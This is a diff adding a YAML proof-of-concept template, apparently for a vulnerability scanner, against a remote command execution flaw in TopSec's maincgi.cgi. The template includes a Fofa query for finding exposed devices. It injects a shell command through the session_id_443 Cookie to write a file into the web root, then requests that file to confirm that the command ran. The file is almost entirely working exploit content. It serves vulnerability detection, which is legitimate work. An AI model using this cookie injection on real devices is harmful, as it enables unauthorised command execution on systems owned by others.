@@ -1,0 +1,31 @@
+id: topsec-maincgi-rce
+
+info:
+  name: 天融信TOPSEC_maincgi.cgi远程命令执行
+  author: zan8in
+  severity: critical
+  verified: false
+  description: |-
+    Fofa: title="Web User Login" && body="/cgi/maincgi.cgi?Url=VerifyCode"
+  reference:
+    - https://mp.weixin.qq.com/s/4lParHiO8AD6RgC0H-tP6g
+  tags: topsec,rce
+  created: 2024/02/29
+
+set:
+  randstr: randomLowercase(16)
+  filename: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cgi/maincgi.cgi?Url=check
+      headers:
+        Cookie: session_id_443=1|echo '{{randstr}}' >> /www/htdocs/site/image/{{filename}}.txt;
+    expression: response.status == 200 && response.body.bcontains(b'alert') && response.body.bcontains(b'window.opener')
+  r1:
+    request:
+      method: GET
+      path: /site/image/{{filename}}.txt
+    expression: response.status == 200 && response.body.bcontains(bytes(randstr))
+expression: r0() && r1()
